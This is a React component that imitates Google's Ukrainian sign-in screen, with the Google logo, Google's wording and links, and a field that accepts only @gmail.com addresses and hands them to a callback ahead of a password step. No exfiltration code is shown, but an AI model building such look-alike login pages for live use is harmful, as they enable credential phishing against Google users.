import {useState, useRef} from "react"
import googleLogo from "./assets/google-logo.svg"
import "./App.scss"
import Password from "./Password.jsx"
function Email({saveMail, forgetPass}) {
   const [classForInput, setClassForInput] = useState("")
   const [errorClass, setErrorClass] = useState("")

   function handleClassForInput(e) {
      // if (classForInput === "focus") setClassForInput("")
      // else setClassForInput("focus")
      e.stopPropagation()
      setClassForInput("focus")
      focus()
   }
   const inputRef = useRef(null)

   function focus() {
      inputRef.current.focus()
   }

   function blockEvent() {
      if (!inputRef.current.value.length > 0) setClassForInput("")
      // else if (inputRef.current.value.length === 0) setClassForInput("")
      else setClassForInput("focus focus-two")
   }

   const errorMessage = "Не вдалося знайти ваш обліковий запис Google"

   function toTheNextPage(e) {
      e.stopPropagation()
      if (!inputRef.current.value.endsWith("@gmail.com")) {
         setErrorClass("error")
         throw new Error("This email does not correct")
      } else {
         setErrorClass("")
         saveMail(inputRef.current.value)
      }
   }

   const handleKeyDown = e => {
      e.stopPropagation()
      if (e.key === "Enter") {
         if (!inputRef.current.value.endsWith("@gmail.com")) {
            setErrorClass("error")
            throw new Error("This email does not correct")
         } else {
            setErrorClass("")
            saveMail(inputRef.current.value)
         }
      }
   }

   function forgetPassAction() {
      forgetPass()
   }

   return (
      <div onClick={blockEvent} className="block">
         <div className="enter">
            <div className="enter__left">
               <img src={googleLogo} alt="google logo" className="enter__logo" />
               <h1 className="enter__title">Увійти</h1>
               <h4 className="enter__sub-title">Використовуйте свій обліковий запис Google</h4>
            </div>
            <div className="enter__right">
               <div className="enter__info-enter">
                  <div onClick={handleClassForInput} onKeyDown={handleKeyDown} className={`enter__input ${classForInput} ${errorClass}`}>
                     <input ref={inputRef} type="email" spellCheck="false" />
                     <span>Електронна адреса або телефон</span>
                  </div>
                  <p className={`enter__error ${errorClass}`}>
                     <svg
                        aria-hidden="true"
                        fill="currentColor"
                        focusable="false"
                        width="16px"
                        height="16px"
                        viewBox="0 0 24 24"
                        xmlns="https://www.w3.org/2000/svg"
                     >
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                     </svg>{" "}
                     {errorMessage}
                  </p>
                  <button onClick={forgetPassAction} className="enter__forget">
                     Забули електронну адресу?
                  </button>
               </div>
               <p className="enter__help">
                  Інший комп’ютер? Щоб увійти в обліковий запис, відкрийте анонімне вікно.{" "}
                  <a
                     href="https://support.google.com/accounts/answer/2917834?visit_id=638661675643073762-372066819&p=signin_privatebrowsing&hl=uk&rd=1"
                     target="_blank"
                  >
                     Докладніше про режим гостя
                  </a>
               </p>
               <div className="enter__buttons">
                  <button>Створити обліковий запис</button>
                  <button onClick={toTheNextPage} className="bg">
                     Далі
                  </button>
               </div>
            </div>
         </div>
         <div className="sub-info">
            <div className="sub-info__select">
               <select name="language">
                  <option value="ukr">Українська</option>
                  <option value="eng">Англійська</option>
               </select>
               <svg class="sub-info__arrows" viewBox="7 10 10 5" focusable="false">
                  <polygon class="sub-info__down-arrow" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15"></polygon>
                  {/* <polygon class="sub-info__up-arr" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10"></polygon> */}
               </svg>
            </div>
            <ul className="sub-info__links">
               <li className="sub-info__item-link">
                  <a
                     target="_blank"
                     href="https://support.google.com/accounts?hl=uk&visit_id=638661675643073762-372066819&rd=2&p=account_iph#topic=3382296"
                  >
                     Довідка
                  </a>
               </li>
               <li className="sub-info__item-link">
                  <a target="_blank" href="policies.google.com/privacy?gl=UA&hl=uk">
                     Конфіденційність
                  </a>
               </li>
               <li className="sub-info__item-link">
                  <a target="_blank" href="https://policies.google.com/terms?gl=UA&hl=uk">
                     Умови
                  </a>
               </li>
            </ul>
         </div>
      </div>
   )
}

export default Email
